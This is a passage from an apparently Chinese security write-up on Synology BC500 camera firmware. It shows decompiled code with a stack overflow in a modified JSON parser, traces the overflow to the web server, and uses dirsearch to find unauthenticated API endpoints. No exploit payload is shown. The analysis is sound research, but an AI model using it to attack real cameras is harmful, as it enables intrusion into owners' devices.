class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  lex_scan(lex, error);</span><br><span class="line">  <span class="keyword">if</span> ( lex-&gt;token == <span class="string">'}'</span> )</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( lex-&gt;token != <span class="number">0x100</span> )</span><br><span class="line">    {</span><br><span class="line">      error_set(error, lex, <span class="string">"string or '}' expected"</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">    }</span><br><span class="line">    key = lex_steal_string(lex, &amp;len);</span><br><span class="line">    <span class="keyword">if</span> ( !key )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">memchr</span>(key, <span class="number">0</span>, len) )</span><br><span class="line">    {</span><br><span class="line">      jsonp_free(key);</span><br><span class="line">      error_set(error, lex, <span class="string">"NUL byte in object key not supported"</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">    }</span><br><span class="line">    v10[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    _isoc99_sscanf(key, <span class="string">"%s %s"</span>, v9, v10);      <span class="comment">// stack-based buffer overflow</span></span><br><span class="line">    <span class="keyword">if</span> ( (flags &amp; <span class="number">1</span>) != <span class="number">0</span> &amp;&amp; j_json_object_get(object, v9) )</span><br><span class="line">    {</span><br><span class="line">      jsonp_free(key);</span><br><span class="line">      error_set(error, lex, <span class="string">"duplicate object key"</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">    }</span><br><span class="line">    lex_scan(lex, error);</span><br><span class="line">    <span class="keyword">if</span> ( lex-&gt;token != <span class="number">58</span> )</span><br><span class="line">    {</span><br><span class="line">      jsonp_free(key);</span><br><span class="line">      error_set(error, lex, <span class="string">"':' expected"</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">    }</span><br><span class="line">    lex_scan(lex, error);</span><br><span class="line">    value = parse_value(lex, flags, error);</span><br><span class="line">    <span class="keyword">if</span> ( !value )</span><br><span class="line">    {</span><br><span class="line">      jsonp_free(key);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> ( v10[<span class="number">0</span>] )</span><br><span class="line">    {</span><br><span class="line">      v4 = sub_6A04(v10);</span><br><span class="line">      *(value + <span class="number">8</span>) = v4;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      *(value + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> ( sub_5170(object, v9, value) )</span><br><span class="line">    {</span><br><span class="line">      jsonp_free(key);</span><br><span class="line">      json_decref(value);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">    }</span><br><span class="line">    json_decref(value);</span><br><span class="line">    jsonp_free(key);</span><br><span class="line">    lex_scan(lex, error);</span><br><span class="line">    <span class="keyword">if</span> ( lex-&gt;token != <span class="string">','</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    lex_scan(lex, error);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> ( lex-&gt;token == <span class="string">'}'</span> )</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">  error_set(error, lex, <span class="string">"'}' expected"</span>);</span><br><span class="line">LABEL_28:</span><br><span class="line">  json_decref(object);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>发现了漏洞点之后需要去找触发此漏洞的方式，经过与libjansson这个公开json解析库进行源码对比的时候发现<code>parse_object</code>会被<code>parse_value</code>调用，<code>parse_value</code>会被<code>parse_json</code>调用，最后<code>parse_json</code>会被<code>json_loads/json_loadb/json_loadf/json_loadfd/json_load_callback</code>这5个函数调用</p><p>最后在grep筛选的时候只有<code>json_loads</code>这个接口在服务器中被调用，所以调用链为<code>parse_object-&gt;parse_value-&gt;json_loads</code></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Binary file ./bin/synoaid matches</span><br><span class="line">Binary file ./bin/diag matches</span><br><span class="line">Binary file ./bin/systemd matches</span><br><span class="line">Binary file ./bin/webd matches</span><br><span class="line">Binary file ./bin/webd.id0 matches</span><br><span class="line">Binary file ./bin/central_server matches</span><br><span class="line">Binary file ./bin/webd.i64 matches</span><br><span class="line">Binary file ./bin/synoactiond matches</span><br><span class="line">Binary file ./www/uistrings/uistrings.cgi.i64 matches</span><br><span class="line">Binary file ./www/uistrings/uistrings.cgi matches</span><br><span class="line">Binary file ./www/uistrings/uistrings.cgi.id0 matches</span><br><span class="line">Binary file ./www/cgi2/factory.cgi.i64 matches</span><br><span class="line">Binary file ./www/cgi2/fwupgrade.cgi matches</span><br><span class="line">Binary file ./www/cgi2/config.cgi matches</span><br><span class="line">Binary file ./www/cgi2/factorydefault.cgi matches</span><br><span class="line">Binary file ./www/cgi2/param.cgi matches</span><br><span class="line">Binary file ./www/cgi2/factory.cgi matches</span><br><span class="line">Binary file ./www/camera-cgi/synocam_fw_upgrade.cgi.i64 matches</span><br><span class="line">Binary file ./www/camera-cgi/synocam_param.cgi.i64 matches</span><br><span class="line">Binary file ./www/camera-cgi/synocam_fw_upgrade.cgi matches</span><br><span class="line">Binary file ./www/camera-cgi/synocam_param.cgi matches</span><br><span class="line">Binary file ./www/camera-cgi/synocam_log_retrieve.cgi matches</span><br><span class="line">Binary file ./www/camera-cgi/synocam_reset.cgi matches</span><br><span class="line">Binary file ./www/camera-cgi/synocam_system_report.cgi matches</span><br><span class="line">Binary file ./lib/libjansson.so.4.7.0 matches</span><br><span class="line">Binary file ./lib/libjansson.so.4.7.0.id0 matches</span><br><span class="line">Binary file ./lib/libutil.so matches</span><br><span class="line">Binary file ./opt/onvif/wsdd matches</span><br><span class="line">Binary file ./opt/onvif/onvifd matches</span><br></pre></td></tr></tbody></table></figure><p>有很多都调用了<code>json_loads</code>，无法确定哪一个，发现webd是这个摄像头的webserver，所以对其进行简要分析一下</p><p>在webd中发现了处理函数<code>sub_35CEC</code></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">handle_main</span><span class="params">(<span class="type">int</span> *a1)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  sub_30F24();</span><br><span class="line">  sub_30E04();</span><br><span class="line">  v2 = open(<span class="string">"/tmp/ConnInfo"</span>, <span class="number">193</span>, <span class="number">420</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">-1</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( *_errno_location() != <span class="number">17</span> )</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Failed to touch ConnInfo file [%m].\n"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    close(v2);</span><br><span class="line">  }</span><br><span class="line">  sub_24C64(a1, <span class="string">"/syno-api"</span>, (<span class="type">int</span>)sub_35CEC, <span class="number">0</span>);</span><br><span class="line">  sub_24D94((<span class="type">int</span>)a1, <span class="string">"/heartbeat/connect"</span>, (<span class="type">int</span>)sub_331F4, (<span class="type">char</span>)sub_33EDC, (<span class="type">int</span>)sub_2D6CC, (<span class="type">int</span>)sub_31BDC, <span class="number">0</span>);</span><br><span class="line">  sub_24D94((<span class="type">int</span>)a1, <span class="string">"/webstream/connect"</span>, (<span class="type">int</span>)sub_3323C, (<span class="type">char</span>)sub_2E97C, (<span class="type">int</span>)sub_2D360, (<span class="type">int</span>)sub_2D870, <span class="number">0</span>);</span><br><span class="line">  sub_24D94((<span class="type">int</span>)a1, <span class="string">"/aievent/connect"</span>, (<span class="type">int</span>)sub_33284, (<span class="type">char</span>)sub_2E8F4, (<span class="type">int</span>)sub_2E7DC, (<span class="type">int</span>)sub_2D8F8, <span class="number">0</span>);</span><br><span class="line">  v3 = sub_2F5DC();</span><br><span class="line">  v4 = sub_2F670(v3);</span><br><span class="line">  v5 = sub_30BB4(v4);</span><br><span class="line">  v6 = sub_30C48(v5);</span><br><span class="line">  sub_2F704(v6);</span><br><span class="line">  v7 = sub_2F798();</span><br><span class="line">  v8 = sub_30CDC(v7);</span><br><span class="line">  v9 = sub_30D70(v8);</span><br><span class="line">  <span class="keyword">return</span> sub_30E90(v9);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><code>sub_35CEC</code>这里主要进行路由请求到后端不同的cgi处理功能点，那就需要判断出是否有功能点存在未授权访问，如果这个函数中没有找到路由请求，那就会调用<code>/www/camera-cgi/synocam_param.cgi</code>这个cgi</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_35CEC</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">......</span><br><span class="line">  method = <span class="built_in">sub_194D8</span>(a1);</span><br><span class="line">  s1 = v62;</span><br><span class="line">  v63 = v65;</span><br><span class="line">  v66[<span class="number">0</span>] = v67;</span><br><span class="line">  v61 = <span class="number">0</span>;</span><br><span class="line">  v62[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v64 = <span class="number">0</span>;</span><br><span class="line">  v65[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v66[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v67[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v90, <span class="number">0</span>, <span class="built_in">sizeof</span>(v90));</span><br><span class="line">  v3 = <span class="built_in">sub_8B548</span>((<span class="type">int</span>)<span class="string">"Custom.Activated"</span>);</span><br><span class="line">  v4 = (<span class="type">char</span> *)method[<span class="number">4</span>];</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(<span class="string">"/syno-api"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(v4, <span class="string">"/syno-api"</span>, v5) )</span><br><span class="line">  {</span><br><span class="line">LABEL_45:</span><br><span class="line">    v9 = <span class="number">400</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">  }</span><br><span class="line">  v6 = (<span class="type">const</span> <span class="type">char</span> *)*method;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>((<span class="type">const</span> <span class="type">char</span> *)*method, <span class="string">"GET"</span>) &amp;&amp; <span class="built_in">strcmp</span>(v6, <span class="string">"PUT"</span>) &amp;&amp; <span class="built_in">strcmp</span>(v6, <span class="string">"POST"</span>) &amp;&amp; <span class="built_in">strcmp</span>(v6, <span class="string">"DELETE"</span>) )</span><br><span class="line">  {</span><br><span class="line">    std::string::<span class="built_in">assign</span>(v66, <span class="string">"Method Not Allowed"</span>);</span><br><span class="line">    v9 = <span class="number">405</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">sub_31A40</span>(v68, v4);</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(&amp;s1, v68);</span><br><span class="line">  <span class="keyword">if</span> ( v68[<span class="number">0</span>] != &amp;v69 )</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v68[<span class="number">0</span>])</span></span>;</span><br><span class="line">  <span class="keyword">if</span> ( v3 || <span class="built_in">sub_3CC70</span>((<span class="type">int</span>)&amp;unk_C1964, (<span class="type">int</span>)&amp;s1) || <span class="built_in">sub_3CC70</span>((<span class="type">int</span>)&amp;unk_C1980, (<span class="type">int</span>)&amp;s1) )</span><br><span class="line">  {</span><br><span class="line">LABEL_7:</span><br><span class="line">    path = (<span class="type">char</span> *)method[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(path, <span class="string">"/syno-api/security"</span>) || !<span class="built_in">strcmp</span>(path, <span class="string">"/syno-api/security/encryption_key"</span>) )</span><br><span class="line">    {</span><br><span class="line">    .....</span><br><span class="line"></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(path, <span class="string">"/syno-api/session"</span>) &amp;&amp; !<span class="built_in">strcmp</span>((<span class="type">const</span> <span class="type">char</span> *)*method, <span class="string">"GET"</span>) )</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">sub_33B2C</span>(method) )</span><br><span class="line">            <span class="built_in">sub_337D4</span>((<span class="type">int</span>)v76);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">sub_31A40</span>(v76, <span class="string">"Invalid session"</span>);</span><br><span class="line">          std::string::<span class="keyword">operator</span>=(&amp;v63, v76);</span><br><span class="line">          <span class="keyword">if</span> ( v76[<span class="number">0</span>] != &amp;v77 )</span><br><span class="line">            <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v76[<span class="number">0</span>])</span></span>;</span><br><span class="line">          <span class="built_in">sub_31A40</span>(&amp;nptr, <span class="string">""</span>);</span><br><span class="line">          <span class="built_in">send_page</span>(a1, <span class="number">200</span>, &amp;v63, &amp;nptr);</span><br><span class="line">          v48 = nptr;</span><br><span class="line">          <span class="keyword">if</span> ( nptr == (<span class="type">char</span> *)v88 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_146;</span><br><span class="line">        }</span><br><span class="line">        ......</span><br><span class="line">            <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(path, <span class="string">"/syno-api/camera_cap"</span>) || <span class="built_in">strcmp</span>((<span class="type">const</span> <span class="type">char</span> *)*method, <span class="string">"GET"</span>) )</span><br><span class="line">            {</span><br><span class="line">              <span class="built_in">execve_cgi</span>((<span class="type">int</span>)a1, <span class="string">"/www/camera-cgi/synocam_param.cgi"</span>);</span><br><span class="line">              <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">            }</span><br><span class="line">            file = <span class="built_in">json_load_file</span>(<span class="string">"/www/camera-cgi/synocam_cap.json"</span>, <span class="number">4</span>);</span><br><span class="line">            v56 = file;</span><br><span class="line">            <span class="keyword">if</span> ( file )</span><br><span class="line">            {</span><br><span class="line">              <span class="built_in">sub_50DB4</span>(&amp;v83, file);</span><br><span class="line">              <span class="built_in">sub_31A40</span>(&amp;nptr, <span class="string">""</span>);</span><br><span class="line">              <span class="built_in">send_page</span>(a1, <span class="number">200</span>, &amp;v83, &amp;nptr);</span><br><span class="line">              <span class="keyword">if</span> ( nptr != (<span class="type">char</span> *)v88 )</span><br><span class="line">                <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(nptr)</span></span>;</span><br><span class="line">              <span class="keyword">if</span> ( v83 != v85 )</span><br><span class="line">                <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v83)</span></span>;</span><br><span class="line">              <span class="built_in">pgo_free</span>(v56);</span><br><span class="line">              <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">            }</span><br><span class="line">            <span class="built_in">sub_4E38C</span>(</span><br><span class="line">              <span class="number">0</span>,</span><br><span class="line">              (<span class="type">int</span>)<span class="string">"MID/BC500/webservice.cpp"</span>,</span><br><span class="line">              <span class="number">3055</span>,</span><br><span class="line">              (<span class="type">int</span>)<span class="string">"SynoHandler"</span>,</span><br><span class="line">              (<span class="type">int</span>)<span class="string">"System"</span>,</span><br><span class="line">              <span class="number">-1</span>,</span><br><span class="line">              <span class="string">"pgo_load_file [%s] load failed.\n"</span>);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_45;</span><br><span class="line">          }</span><br><span class="line">          v84 = <span class="number">0</span>;</span><br><span class="line">          <span class="built_in">LOBYTE</span>(v85[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">          v83 = v85;</span><br><span class="line">          <span class="built_in">memset</span>(v91, <span class="number">0</span>, <span class="built_in">sizeof</span>(v91));</span><br><span class="line">          <span class="keyword">for</span> ( i = <span class="built_in">sub_1BA70</span>((<span class="type">int</span>)a1); i &gt; <span class="number">0</span>; i = <span class="built_in">sub_1BA70</span>((<span class="type">int</span>)a1) )</span><br><span class="line">          {</span><br><span class="line">            v20 += i;</span><br><span class="line">            <span class="keyword">if</span> ( v20 &gt; <span class="number">0x100000</span> )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            nptr = (<span class="type">char</span> *)v88;</span><br><span class="line">            std::string::_M_construct&lt;<span class="type">char</span> <span class="type">const</span>*&gt;((<span class="type">int</span>)&amp;nptr, v91);</span><br><span class="line">            std::string::_M_append(&amp;v83, nptr, v87);</span><br><span class="line">            <span class="keyword">if</span> ( nptr != (<span class="type">char</span> *)v88 )</span><br><span class="line">              <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(nptr)</span></span>;</span><br><span class="line">  ......</span><br><span class="line">  <span class="keyword">return</span> v9;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>所以现在看一下有哪些路由请求可以未授权访问，一开始我是用自己写的脚本来探测的，但是后面看到了这位<a href="https://eqqie.cn/index.php/archives/2076">师傅</a>的思路之后发现用到dirsearch，查看之后发现这个工具远比我自己写的脚本好用，所以我用dirsearch测试了一下</p><p>grep筛选的时候发现<code>vue.bundle.js</code>这个js里存在很多api url，我简单的写了个脚本抓取了一下</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'vue.bundle.js'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    text = f.read()</span><br><span class="line"></span><br><span class="line">urls = re.findall(<span class="string">r'url:"(.*?)"'</span>, text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> urls:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></tbody></table></figure><p>同时我也把整个web目录的所有文件的url都集合到了wordlist.txt里，然后使用dirsearch扫了一下，扫描的时候排除了<code>404,301,401</code></p><p>之后发现了一些url是存在未授权访问的</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http://127.0.0.1:8801/ -w /your/path/wordlist.txt -x 404,301,401</span><br><span class="line"></span><br><span class="line">[01:33:21] 200 -   24KB - /uistrings/cht/strings                            </span><br><span class="line">[01:33:21] 200 -   24KB - /uistrings/chs/strings                            </span><br><span class="line">[01:33:21] 200 -   27KB - /uistrings/enu/strings                            </span><br><span class="line">[01:33:22] 200 -    6MB - /uistrings/uistrings.cgi.i64                      </span><br><span class="line">[01:33:22] 200 -   28KB - /uistrings/dan/strings</span><br><span class="line">[01:33:22] 200 -   34KB - /uistrings/jpn/strings                            </span><br><span class="line">[01:33:22] 200 -   29KB - /uistrings/ptb/strings</span><br><span class="line">[01:33:22] 200 -   28KB - /uistrings/nor/strings</span><br><span class="line">[01:33:22] 200 -   32KB - /uistrings/hun/strings                            </span><br><span class="line">[01:33:22] 200 -   29KB - /uistrings/ita/strings</span><br><span class="line">[01:33:23] 200 -   29KB - /uistrings/sve/strings                            </span><br><span class="line">[01:33:23] 200 -   31KB - /uistrings/ger/strings</span><br><span class="line">[01:33:22] 200 -   30KB - /uistrings/krn/strings                            </span><br><span class="line">[01:33:23] 200 -   31KB - /uistrings/plk/strings                            </span><br><span class="line">[01:33:23] 200 -   32KB - /uistrings/fre/strings</span><br><span class="line">[01:33:23] 200 -   30KB - /uistrings/ptg/strings</span><br><span class="line">[01:33:23] 200 -   29KB - /uistrings/uistrings.cgi</span><br><span class="line">[01:33:23] 200 -   30KB - /uistrings/nld/strings</span><br><span class="line">[01:33:24] 200 -   48KB - /uistrings/rus/strings                            </span><br><span class="line">[01:33:24] 200 -   61KB - /uistrings/tha/strings                            </span><br><span class="line">[01:33:24] 200 -   30KB - /uistrings/trk/strings</span><br><span class="line">[01:33:23] 200 -   30KB - /uistrings/spn/strings                            </span><br><span class="line">[01:33:23] 200 -   29KB - /uistrings/csy/strings                            </span><br><span class="line">[01:33:25] 200 -    6KB - /crypto.min.js                                    </span><br><span class="line">[01:33:25] 200 -    2MB - /vue.bundle.js                                    </span><br><span class="line">[01:33:25] 200 -   15B  - /syno-api/session                                 </span><br><span class="line">[01:33:25] 200 -    6B  - /syno-api/activate</span><br><span class="line">[01:33:25] 200 -    9B  - /syno-api/security/info/model</span><br><span class="line">[01:33:25] 200 -    9B  - /syno-api/security/info/name                      </span><br><span class="line">[01:33:26] 200 -   14B  - /syno-api/maintenance/firmware/version            </span><br><span class="line">[01:33:26] 200 -    1MB - /style/main.css                                   </span><br><span class="line">[01:33:27] 200 -    7B  - /syno-api/security/info/language                   </span><br><span class="line">[01:33:27] 200 -   21B  - /syno-api/security/info/mac</span><br><span class="line">[01:33:27] 200 -    6B  - /syno-api/security/network/dhcp</span><br><span class="line">[01:33:27] 200 -  105B  - /syno-api/security/info</span><br><span class="line">[01:33:27] 200 -    4B  - /syno-api/security/info/serial_number</span><br></pre></td></tr></tbody></table></figure><p>看到了一些<code>/syno-api</code>的url，而这些url会进入<code>synocam_param.cgi</code>，现在分析一下<code>synocam_param.cgi</code></p><p>根据format判断返回的格式，然后根据请求方法使用不同函数处理请求</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_7BC84</span><span class="params">(<span class="type">json_t</span> *json, <span class="keyword">volatile</span> <span class="type">size_t</span> a2, <span class="type">json_t</span> *a3)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">size_t</span> refcount; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">size_t</span> v7; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> *v8; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v9; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> *method; <span class="comment">// [sp+10h] [bp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  a3-&gt;type = (json_type)json;</span><br><span class="line">  a3-&gt;refcount = a2;</span><br><span class="line">  v3 = (<span class="type">const</span> <span class="type">char</span> *)sub_E19C(json, <span class="string">"format"</span>);</span><br><span class="line">  a3[<span 